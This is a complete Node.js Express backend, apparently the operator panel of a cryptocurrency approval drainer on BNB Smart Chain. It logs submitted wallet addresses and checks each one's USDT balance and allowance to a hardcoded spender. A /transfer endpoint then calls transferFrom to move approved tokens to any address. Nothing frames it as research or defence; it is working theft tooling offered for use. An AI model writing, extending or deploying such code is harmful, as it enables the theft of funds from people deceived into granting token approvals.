
const express = require("express");
const path = require("path");
const dotenv = require("dotenv");
const { ethers } = require("ethers");
const fs = require("fs");

dotenv.config();

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

const PRIVATE_KEY = process.env.PRIVATE_KEY;

const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/", {
  name: "binance",
  chainId: 56,
});

const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

const USDT_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function transferFrom(address from, address to, uint amount) returns (bool)"
];

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const SPENDER_ADDRESS = "0x61f6f18fbc3ea4060b5aac3894094d1b3322c63b";
const contract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, wallet);

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});

app.get("/wallets", async (req, res) => {
  try {
    const walletList = JSON.parse(fs.readFileSync("wallets.json"));
    const result = await Promise.all(walletList.map(async (addr) => {
      const balance = await contract.balanceOf(addr);
      const allowance = await contract.allowance(addr, SPENDER_ADDRESS);
      return {
        wallet: addr,
        balance: ethers.utils.formatUnits(balance, 18),
        approved: allowance.gt(0) ? "✅ YES" : "❌ NO"
      };
    }));

    res.json(result);
  } catch (err) {
    console.error("❌ Error loading wallets:", err);
    res.status(500).json({ error: "Failed to fetch wallets or balances" });
  }
});

app.post("/transfer", async (req, res) => {
  try {
    const { fromWallet, toWallet, amount } = req.body;
    const tx = await contract.transferFrom(fromWallet, toWallet, ethers.utils.parseUnits(amount, 18));
    await tx.wait();
    res.json({ success: true, hash: tx.hash });
  } catch (err) {
    console.error("❌ Transfer Error:", err);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post("/log", async (req, res) => {
  const { wallet } = req.body;
  if (!wallet || !wallet.startsWith("0x")) return res.status(400).json({ error: "Invalid wallet" });

  let walletList = [];
  try {
    walletList = JSON.parse(fs.readFileSync("wallets.json"));
  } catch (e) {
    console.warn("wallets.json not found, creating new.");
  }

  if (!walletList.includes(wallet)) {
    walletList.push(wallet);
    fs.writeFileSync("wallets.json", JSON.stringify(walletList, null, 2));
  }

  res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Backend admin panel running at http://localhost:${PORT}`);
});
